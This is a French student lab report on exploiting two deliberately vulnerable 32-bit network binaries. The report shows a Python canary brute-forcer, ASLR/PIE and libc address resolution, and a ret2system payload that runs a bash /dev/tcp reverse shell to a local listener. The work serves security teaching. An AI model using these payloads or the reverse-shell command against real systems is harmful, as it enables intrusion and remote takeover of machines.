# Analyse et exploitation — Week 2

## Introduction

L'objectif de cette séance est d'analyser plusieurs programmes C vulnérables afin d'identifier les failles présentes dans leur implémentation et d'étudier leur exploitation dans l'environnement fourni pour le TP.

Pour cette séance, je me suis intéressé aux mécanismes suivants :

* analyse statique de binaires ELF 32 bits ;
* analyse de la pile et du mécanisme de stack canary ;
* prise en compte de l'ASLR et du PIE ;
* recherche d'adresses utiles dans le programme et dans `libc` ;
* construction de payloads ;
* exploitation d'un débordement de tampon ;
* contrôle du flot d'exécution ;
* utilisation de fonctions présentes dans `libc` ;
* déclenchement d'un reverse shell.

Les adresses mémoire présentées dans ce rapport correspondent à mes exécutions et peuvent varier d'une exécution ou d'une machine à l'autre.

---

# Exercice 1 — Exploitation de `exo1`

## 1. Analyse initiale du binaire

J'ai commencé par analyser le fichier `exo1` afin de déterminer son architecture et les protections utilisées.

J'ai utilisé notamment :

```bash
file ./exo1
readelf -h ./exo1
readelf -s ./exo1
strings -a ./exo1
ldd ./exo1
```

L'analyse a confirmé qu'il s'agissait d'un binaire ELF 32 bits utilisant `libc` 32 bits.

La commande `strings` a notamment permis d'identifier plusieurs fonctions intéressantes :

```text
system
socket
bind
listen
accept
fork
read
write
```

La présence de `system` était particulièrement intéressante puisque l'objectif de l'exercice était de forcer le programme à exécuter une commande permettant d'obtenir un reverse shell.

J'ai également identifié les fonctions propres au programme :

```text
main
handle_client
handle_ping
handle_hello
handle_bye
```

ainsi que la variable globale `username`.

## 2. Analyse de `handle_ping`

L'étude du désassemblage de `handle_ping` avec `objdump` m'a permis de comprendre la disposition de la pile.

La fonction réserve notamment :

```asm
sub esp,0x410
```

Le buffer utilisé par la fonction est situé à proximité de cette zone.

Le buffer logique fait 1024 octets, mais la fonction utilise une taille fournie par le client pour effectuer la lecture. Cette situation permet d'étudier un débordement de tampon.

## 3. Identification du stack canary

Le programme est compilé avec une protection de type stack protector.

Le désassemblage confirme la présence d'un stack canary :

```asm
mov eax,gs:0x14
mov [ebp-0xc],eax
```

Le canary est donc stocké à :

```text
[ebp-0xc]
```

Avant le retour de la fonction, sa valeur est vérifiée :

```asm
mov edx,[ebp-0xc]
sub edx,gs:0x14
je ...
call __stack_chk_fail_local
```

Si la valeur a été modifiée, le programme appelle `__stack_chk_fail_local`.

Il n'était donc pas possible d'écraser directement la pile jusqu'à l'adresse de retour sans tenir compte de cette protection.

## 4. Recherche automatique du canary

Pour déterminer le canary, j'ai développé un programme Python utilisant une connexion TCP vers le service.

Le principe consiste à tester les octets du canary progressivement. Le programme envoie d'abord :

```text
[A x 1024]
```

puis les octets déjà trouvés et un candidat pour l'octet suivant.

Le comportement du programme permet de déterminer si le candidat est correct.

La fonction utilisée pour cette recherche est :

```python
def bruteforce_stack(size):

    data = b''

    while len(data) < size:

        found = False
        position = len(data)

        for b in range(256):

            send_data = data + bytes([b])

            if oracle(data=send_data):

                data = send_data
                found = True
                break

        if not found:
            break

    return data
```

Le canary étant composé de quatre octets sur cette architecture, j'ai utilisé :

```python
canary = bruteforce_stack(4)
```

Cette méthode a permis de retrouver automatiquement la valeur nécessaire à la construction du payload.

Le même programme de recherche du canary a ensuite été réutilisé pour l'exercice 2.

## 5. Analyse de l'ASLR et du PIE

L'analyse du binaire et des mappings mémoire a montré que les adresses du programme ne sont pas fixes.

J'ai notamment utilisé :

```bash
cat /proc/<pid>/maps
```

pour observer les différentes zones mémoire du processus.

Le binaire étant position-independent, sa base mémoire change selon l'exécution.

Je ne pouvais donc pas simplement utiliser une adresse absolue récupérée lors d'une exécution précédente.

J'ai utilisé la base du PIE pour recalculer les adresses relatives du programme.

## 6. Identification de `system` et de `username`

J'ai identifié les fonctions utiles dans `libc` :

```text
system
execve
dup2
```

La chaîne `/bin/sh` était également disponible dans `libc`.

Pour l'exploitation retenue, j'ai utilisé `system` et une commande placée dans la variable globale `username`.

La variable `username` a été identifiée avec :

```bash
readelf -s ./exo1 | grep username
```

Son adresse réelle pouvait ensuite être calculée à partir de sa position relative dans le binaire et de la base PIE courante.

## 7. Compréhension du rôle de EBX

Le désassemblage de `handle_ping` montre :

```asm
call __x86.get_pc_thunk.bx
add  ebx,0x2ce3
```

La fonction `__x86.get_pc_thunk.bx` est :

```asm
mov ebx,DWORD PTR [esp]
ret
```

Elle récupère une adresse du code courant et la place dans `EBX`.

Dans un exécutable PIE 32 bits, `EBX` est utilisé pour retrouver les données et adresses relatives au programme.

J'ai donc déterminé dynamiquement sa valeur au lieu de la considérer comme une constante universelle.

## 8. Construction du payload

Une fois le canary et les adresses nécessaires déterminés, j'ai construit un payload permettant de préserver le canary tout en contrôlant les données situées après celui-ci.

La structure générale utilisée était :

```text
[A x 1024]

[canary]

[EBX sauvegardé]

[EBP sauvegardé]

[adresse de retour]

[adresse de retour suivante]

[adresse de username]
```

Les 1024 premiers octets remplissent le buffer. Le canary correct permet de passer la vérification du stack protector. Les données suivantes permettent de contrôler le retour de la fonction.

L'adresse de retour a été remplacée par l'adresse de `system`, avec l'adresse de `username` utilisée comme argument.

## 9. Placement de la commande

J'ai envoyé la commande via la fonctionnalité `HELLO` du serveur :

```text
bash -i >& /dev/tcp/127.0.0.1/12345 0>&1
```

Le serveur répondait :

```text
Hello bash -i >& /dev/tcp/127.0.0.1/12345 0>&1
```

Cela permettait de vérifier que la commande avait bien été placée dans `username`.

## 10. Calcul des adresses

Lors d'une exécution, j'ai obtenu par exemple :

```text
PIE base   : 0x5656b000
EBX        : 0x5656ef90
system@plt : 0x5656c0b0
username   : 0x5656f040
```

Ces valeurs sont propres à cette exécution.

Le calcul des adresses repose sur leurs offsets dans le binaire et sur la base PIE courante.

## 11. Exécution de l'exploitation

Après récupération automatique du canary et calcul des adresses nécessaires, le script construit le payload.

Le résultat obtenu était notamment :

```text
[+] Type canary : <class 'int'>

[+] Canary : 0xe3764e00

[+] Taille du payload : 1052

[+] Canary dans le payload : 004e76e3

[+] Payload envoyé
```

Le canary est stocké sous forme d'entier puis converti en représentation little-endian lors de son insertion dans le payload.

Le programme ne déclenche donc pas `__stack_chk_fail_local`, ce qui confirme que la valeur du canary a été correctement reproduite.

## 12. Obtention du reverse shell

J'ai lancé au préalable un listener sur le port `12345`.

Après l'envoi du payload, le listener a reçu :

```text
[+] Connexion reçue depuis 127.0.0.1:33504

[+] Reverse shell connecté.

$
```

Le reverse shell était donc effectivement déclenché.

J'ai ensuite pu exécuter des commandes telles que :

```text
ls
pwd
id
```

L'interaction nécessitait parfois un deuxième appui sur Entrée avant de voir la réponse.

Cela s'explique par le fait que la connexion utilisée est un flux TCP et ne fournit pas directement un véritable pseudo-terminal (PTY). Ce comportement concerne l'interactivité du shell et ne remet pas en cause le déclenchement du reverse shell.

## 13. Bilan de l'exploitation

L'exploitation peut être résumée ainsi :

```text
Entrée contrôlée par le client
          ↓
Débordement du buffer
          ↓
Identification du stack canary
          ↓
Reproduction du canary dans le payload
          ↓
Contrôle des données situées après le canary
          ↓
Contrôle de l'adresse de retour
          ↓
Appel de system()
          ↓
Utilisation de username comme argument
          ↓
Exécution de la commande Bash
          ↓
Connexion TCP vers le listener
          ↓
Reverse shell
```

Cette exploitation m'a permis de mettre en pratique l'analyse de la pile, la compréhension du stack protector, le fonctionnement du PIE/ASLR et la construction d'un payload adapté à l'architecture x86 32 bits.

---

# Exercice 2 — Exploitation de `exo2`

## 1. Analyse initiale du binaire

J'ai ensuite commencé l'analyse de `exo2` avec :

```bash
file ./exo2
readelf -h ./exo2
readelf -W -l ./exo2
```

Le résultat de `file` indique :

```text
ELF 32-bit LSB pie executable, Intel i386
dynamically linked
not stripped
```

`readelf` confirme que le binaire est de type :

```text
DYN (Position-Independent Executable file)
```

Le programme est donc également un exécutable PIE.

## 2. Protections observées

J'ai vérifié les segments `GNU_STACK` et `GNU_RELRO` :

```text
GNU_STACK      RW
GNU_RELRO      R
```

J'ai également vérifié la configuration de l'ASLR :

```bash
cat /proc/sys/kernel/randomize_va_space
```

Le résultat était :

```text
2
```

L'ASLR est donc activé.

## 3. Analyse de `handle_ping`

Le désassemblage de `handle_ping` montre :

```asm
sub esp,0x410
```

ainsi que l'utilisation d'un buffer situé à :

```asm
[ebp-0x40e]
```

La taille du buffer logique est de 1024 octets.

La fonction lit d'abord deux octets afin d'obtenir la taille des données à recevoir :

```asm
push 0x2
lea eax,[ebp-0x40e]
push eax
...
call read@plt
```

Après cette lecture, la valeur est utilisée pour déterminer la quantité de données à lire dans le buffer.

La fonction effectue ensuite une transmission avec `write`.

Cette gestion de la taille fournie par le client permet de transmettre une quantité de données supérieure à la taille logique du buffer et constitue le point exploitable de la fonction.

## 4. Présence du stack canary

Comme dans l'exercice 1, le compilateur a ajouté un mécanisme de protection :

```asm
mov eax,gs:0x14
mov [ebp-0xc],eax
```

Le canary est donc également stocké à :

```text
[ebp-0xc]
```

et vérifié avant le retour de la fonction :

```asm
mov edx,[ebp-0xc]
sub edx,DWORD PTR gs:0x14
je ...
call __stack_chk_fail_local
```

Le débordement doit donc préserver cette valeur pour permettre à la fonction de retourner normalement.

## 5. Réutilisation du programme Python

Le programme Python développé pour l'exercice 1 a été réutilisé afin de rechercher automatiquement le canary de `exo2`.

La méthode consiste toujours à tester les octets successivement jusqu'à obtenir une valeur permettant au programme de poursuivre son exécution sans déclencher le mécanisme de protection.

Cette méthode a permis de retrouver automatiquement le canary de `exo2`.

Cette réutilisation montre que la méthode de recherche ne dépend pas directement d'une valeur de canary particulière : elle exploite le comportement observable du programme pour déterminer progressivement la valeur présente sur la pile.

Lors de l'exploitation finale, le canary obtenu était par exemple :

```text
0xf62cb700
```

Sa représentation little-endian utilisée dans le payload était :

```text
00b72cf6
```

## 6. Analyse des fonctions disponibles

Contrairement à `exo1`, la commande :

```bash
readelf -s ./exo2 | grep -E 'system|username|handle_ping|handle_hello'
```

ne montre pas de fonction `system` :

```text
00004080   256 OBJECT  GLOBAL DEFAULT   25 username
0000135b   170 FUNC   GLOBAL DEFAULT   12 handle_hello
0000126d   238 FUNC   GLOBAL DEFAULT   12 handle_ping
```

L'analyse de la PLT confirme également que `system`, `execve` et `dup2` ne sont pas directement importées par `exo2`.

Les fonctions disponibles comprennent notamment :

```text
read@plt
write@plt
socket@plt
bind@plt
listen@plt
accept@plt
fork@plt
```

Il était donc nécessaire d'utiliser une fonction présente dans la bibliothèque `libc` plutôt qu'une fonction directement importée par le programme.

## 7. Recherche de la base de `libc`

Le programme utilise la bibliothèque :

```text
/usr/lib32/libc.so.6
```

La commande :

```bash
ldd ./exo2
```

a notamment fourni :

```text
libc.so.6 => /usr/lib32/libc.so.6
```

J'ai ensuite vérifié les mappings du processus :

```bash
cat /proc/<pid>/maps | grep libc
```

J'ai obtenu par exemple :

```text
f7c7c000-f7c9b000 r--p 00000000 ... /usr/lib32/libc.so.6
f7c9b000-f7e3e000 r-xp 0001f000 ... /usr/lib32/libc.so.6
f7e3e000-f7eb7000 r--p 001c2000 ... /usr/lib32/libc.so.6
...
```

Comme pour la recherche de la base PIE, la première mapping de `libc.so.6` avec un offset de fichier nul permet de déterminer sa base mémoire.

La base obtenue lors d'une exécution était :

```text
libc base : 0xf7c7c000
```

Cette valeur varie avec l'ASLR.

## 8. Calcul de l'adresse de `system`

J'ai ensuite recherché les offsets des fonctions dans la bibliothèque :

```bash
readelf -s /usr/lib32/libc.so.6 | grep -E ' system@@| execve@@| dup2@@'
```

Le résultat indiquait notamment :

```text
system  00052db0
dup2    0011c0e0
execve  000f0e80
```

L'adresse réelle de `system` peut donc être calculée à partir de la base de `libc` :

```text
system = libc_base + 0x52db0
```

Lors de l'exécution finale :

```text
libc base : 0xf7c7c000
system    : 0xf7ccedb0
```

Ce mécanisme est analogue au calcul des adresses relatives au PIE : l'offset de la fonction reste constant pour une version donnée de la bibliothèque, tandis que sa base mémoire varie avec l'ASLR.

## 9. Calcul des adresses du binaire

Pour `exo2`, j'ai également calculé les adresses relatives à partir de la base PIE.

Le script utilise notamment :

```python
EBX_OFFSET = 0x3f90
SYSTEM_OFFSET = 0x52db0
USERNAME_OFFSET = 0x4040
```

Ainsi :

```text
EBX      = PIE base + 0x3f90
username = PIE base + 0x4040
system   = libc base + 0x52db0
```

Lors d'une exécution finale, les valeurs obtenues étaient :

```text
PIE base   : 0x565ee000
EBX        : 0x565f1f90
libc base  : 0xf7c7c000
system     : 0xf7ccedb0
username   : 0x565f2040
```

Ces adresses sont spécifiques à cette exécution.

## 10. Analyse de `handle_hello`

La fonction `handle_hello` utilise la variable globale `username`.

Le désassemblage montre notamment :

```asm
push 0x100
lea eax,[ebx+0x8c]
push eax
...
call read@plt
```

La fonction lit donc jusqu'à `0x100` octets dans la zone correspondant à `username`.

Elle construit ensuite la réponse :

```asm
lea eax,[ebp-0x40c]
push eax
call snprintf@plt
```

avec la chaîne :

```text
Hello %s
```

La fonctionnalité `HELLO` peut ainsi être utilisée pour placer une chaîne contrôlée dans `username`.

J'ai utilisé cette fonctionnalité afin d'y placer la commande qui sera ensuite passée à `system`.

## 11. Placement de la commande

J'ai utilisé la commande :

```text
bash -i >& /dev/tcp/127.0.0.1/12345 0>&1
```

Le serveur a répondu :

```text
Hello bash -i >& /dev/tcp/127.0.0.1/12345 0>&1
```

Cette réponse permet de vérifier que la commande a bien été enregistrée dans `username`.

## 12. Construction du payload

La disposition de la pile permet de construire un payload de 1052 octets.

La structure utilisée est :

```text
[A x 1024]

[canary]

[EBX sauvegardé]

[remplissage]

[adresse de retour = system]

[adresse de retour suivante]

[adresse de username]
```

Le payload est construit dans le script Python avec :

```python
payload = b'A' * 1024
payload += pack('<I', canary)
payload += pack('<I', ebx)
payload += b'S' * 4
payload += b'P' * 4
payload += pack('<I', system)
payload += pack('<I', 0xdeadbeef)
payload += pack('<I', username)
```

La taille finale obtenue est :

```text
[+] Taille du payload : 1052
```

Le canary est inséré en little-endian :

```text
[+] Canary dans le payload : 00b72cf6
```

La valeur originale :

```text
0xf62cb700
```

est donc correctement représentée en mémoire sous la forme :

```text
00 b7 2c f6
```

## 13. Exploitation

Avant l'envoi du payload, le script récupère dynamiquement :

* la base PIE ;
* la base de `libc` ;
* l'adresse de `system` ;
* l'adresse de `username` ;
* le canary.

Lors d'une exécution, le script affichait :

```text
[+] Canary final : 0xf62cb700

[+] PIE base   : 0x565ee000
[+] EBX        : 0x565f1f90
[+] libc base  : 0xf7c7c000
[+] system     : 0xf7ccedb0
[+] username   : 0x565f2040
```

Le payload a ensuite été envoyé à travers la commande `PING`.

Le programme a accepté le canary correct et le contrôle du flot d'exécution a été obtenu.

## 14. Obtention du reverse shell

Un listener était lancé préalablement sur :

```text
127.0.0.1:12345
```

Après l'envoi du payload, l'exécution de `system` avec `username` comme argument provoque l'exécution de la commande Bash précédemment placée dans la variable globale.

Le listener reçoit alors la connexion TCP provenant du processus exploité.

Le reverse shell est ainsi obtenu avec succès.

Cette exploitation confirme que le contrôle du flot d'exécution a été correctement réalisé malgré la présence du stack canary, du PIE et de l'ASLR.

## 15. Bilan de l'exploitation

L'exploitation de `exo2` peut être résumée ainsi :

```text
Connexion au service
          ↓
Recherche du stack canary
          ↓
Détermination de la base PIE
          ↓
Détermination de la base libc
          ↓
Calcul de l'adresse de system()
          ↓
Calcul de l'adresse de username
          ↓
Placement de la commande dans username
          ↓
Construction du payload
          ↓
Préservation du canary
          ↓
Contrôle de l'adresse de retour
          ↓
Appel de system(username)
          ↓
Exécution de la commande Bash
          ↓
Connexion vers le listener
          ↓
Reverse shell
```

L'exploitation de `exo2` présente donc une différence importante par rapport à `exo1` : `system` n'est pas directement importée par le programme. Son adresse doit être calculée à partir de la base dynamique de `libc`.

Cette étape m'a permis de mettre en pratique la résolution d'adresses dans une bibliothèque partagée ainsi que la prise en compte simultanée du PIE et de l'ASLR.

---

# Comparaison des deux exercices

Les deux exercices reposent sur une vulnérabilité permettant de dépasser les limites logiques du buffer et de contrôler des données présentes sur la pile.

| Élément                          | `exo1`                              | `exo2`                 |
| -------------------------------- | ----------------------------------- | ---------------------- |
| Architecture                     | ELF 32 bits                         | ELF 32 bits            |
| PIE                              | Oui                                 | Oui                    |
| ASLR                             | Oui                                 | Oui                    |
| Stack canary                     | Oui                                 | Oui                    |
| Buffer de `handle_ping`          | 1024 octets                         | 1024 octets            |
| Recherche du canary              | Automatique                         | Automatique            |
| `system` importée par le binaire | Oui                                 | Non                    |
| Adresse de `system`              | Résolue dans le contexte du binaire | Calculée depuis `libc` |
| `username`                       | Variable globale                    | Variable globale       |
| Contrôle du retour               | Oui                                 | Oui                    |
| Reverse shell                    | Oui                                 | Oui                    |

La principale différence concerne donc la résolution de `system`.

Dans `exo1`, une fonction directement exploitable est disponible dans le contexte du binaire, tandis que dans `exo2`, il faut récupérer dynamiquement la base de `libc` puis calculer l'adresse de `system` à partir de son offset.

---

# Conclusion

Cette séance m'a permis d'étudier concrètement plusieurs mécanismes de protection et techniques d'exploitation d'un programme ELF 32 bits.

Pour `exo1`, j'ai notamment pu :

* identifier un débordement de tampon ;
* analyser le fonctionnement du stack canary ;
* retrouver automatiquement sa valeur ;
* tenir compte du PIE et de l'ASLR ;
* identifier `system` et `username` comme éléments utiles ;
* construire un payload ;
* contrôler le flot d'exécution ;
* déclencher une commande Bash ;
* obtenir un reverse shell fonctionnel.

Pour `exo2`, j'ai repris cette démarche et approfondi l'analyse de la résolution dynamique des adresses. J'ai notamment :

* analysé le désassemblage de `handle_ping`, `handle_hello` et `handle_bye` ;
* identifié la présence du stack canary ;
* adapté le programme Python pour retrouver automatiquement le canary ;
* déterminé dynamiquement la base du PIE ;
* déterminé dynamiquement la base de `libc` à partir de `/proc/<pid>/maps` ;
* calculé l'adresse de `system` à partir de son offset dans `libc` ;
* calculé l'adresse de `username` à partir de la base PIE ;
* placé une commande contrôlée dans `username` ;
* construit un payload de 1052 octets ;
* préservé le stack canary ;
* contrôlé l'adresse de retour ;
* obtenu un reverse shell fonctionnel.

Les deux exercices montrent ainsi que les protections modernes ne suppriment pas nécessairement la possibilité d'exploitation, mais obligent l'attaquant à tenir compte de plusieurs mécanismes simultanément. Dans le cas étudié, la connaissance de la structure de la pile, la récupération du canary et la résolution dynamique des adresses ont permis de construire des payloads adaptés à l'environnement d'exécution.

Cette séance m'a également permis de mieux comprendre le fonctionnement de l'architecture x86 32 bits, le rôle de `EBX` dans le code PIE, la représentation little-endian des valeurs en mémoire et la manière dont l'ASLR modifie les adresses de chargement des différents composants du processus.
